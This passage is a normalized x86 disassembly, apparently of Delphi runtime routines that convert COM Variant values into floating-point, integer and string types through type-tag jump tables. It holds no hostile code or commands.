jmp [ edx * 4 + jump_table_411964 ]
mov eax ebx
call sub_411700
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41184c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411700
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117ec
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411948
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41184c
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411898
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40ea14
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_4118fc
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_41184c
fstp [ esp ]
fwait
mov eax ebx
call sub_41184c
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411b2f ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_41184c
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411700
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_4117ec
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411948
fstp [ esp ]
fwait
jmp r-xdata
sub_411c98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411d44
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412c8c
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404334
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_4097e4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d4b
lea eax [ ebp - 0x10 ]
call sub_4040ac
lea eax [ ebp - 0xc ]
call sub_4047b8
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40eea8
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40eea8
jmp r-xdata
sub_411d54
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40eea8
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411db4
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40eea8
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_411e00
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411e55
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f574
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411eb0
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411e5c
lea eax [ ebp - 0x18 ]
call sub_40f24c
retn
sub_411e64
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_414760
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411eb0
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411ecc ]
mov eax ebx
call sub_411c98
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411c98
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411d54
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411eb0
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411e00
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40ea14
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411e64
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4120d1 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411db4
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411c98
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411d54
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411eb0
fistp [ esp ]
fwait
jmp r-xdata
sub_41227c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4047b8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40eea8
pop ebx
pop ebp
retn 0x8
sub_4122b4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_4047b8
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40eea8
pop ebx
pop ebp
retn 0x8
sub_4122ec
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4123a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4047b8
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40eea8
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4123a9
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040d0
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404334
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_407f40
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404904
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404334
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407f04
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404904
jmp r-xdata
jmp r-xdata
call sub_40eab0
sub_4123b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41246f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41244d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40eea8
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_4048c8
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049b4
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412454
lea eax [ ebp - 0x10 ]
call sub_40f24c
retn
sub_41247c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4124d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f574
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4124d9
lea eax [ ebp - 0x10 ]
call sub_40f24c
retn
sub_4124e0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414760
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412555
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_404100
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f24c
retn
sub_412564
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412a9b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_41259d ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404100
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4040ac
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404100
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409710
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404100
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409710
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404100
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41227c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404334
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4122b4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404334
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_4048c8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049b4
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404334
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_4122ec
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404334
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408374
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_404100
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408374
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412564
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4123b0
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_404100
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412aa2
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_4040d0
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_4047d0
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_4040d0
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_4047d0
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_4040d0
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_41247c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_404100
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_404100
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40ea14
test ah 0x40
je r-xdata
mov eax esi
call sub_4040ac
mov edx eax
mov eax ebx
call sub_4124e0
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_4123b0
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_404100
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4123b0
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_404100
jmp r-xdata
jmp [ eax * 4 + jump_table_412831 ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_408288
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_409710
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_409710
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_41227c
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404334
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_4122b4
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404334
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4042d4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_4122ec
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404334
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_404100
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_408288
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_408374
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_408374
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_404100
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_412564
jmp r-xdata
sub_412aa8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412b52
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412b35
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40eea8
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_4048c8
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412b3c
lea eax [ ebp - 0x10 ]
call sub_40f24c
retn
sub_412b60
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412bb6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f574
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_412c8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412bbd
lea eax [ ebp - 0x10 ]
call sub_40f24c
retn
sub_412bc4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_412c7c
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_414760
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412c83
lea eax [ ebp - 0x20 ]
call sub_4047b8
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412c5f
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_4048c8
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f24c
retn
sub_412c8c
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4131de
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_412cc6 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_404904
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_4047b8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404904
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408288
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404904
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409710
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404904
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409710
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404904
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_41227c
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4047f4
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4122b4
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4047f4
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_4048c8
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_4049b4
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_4122ec
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4047f4
jmp r-xdata
lea edx [ ebp - 0x24 ]
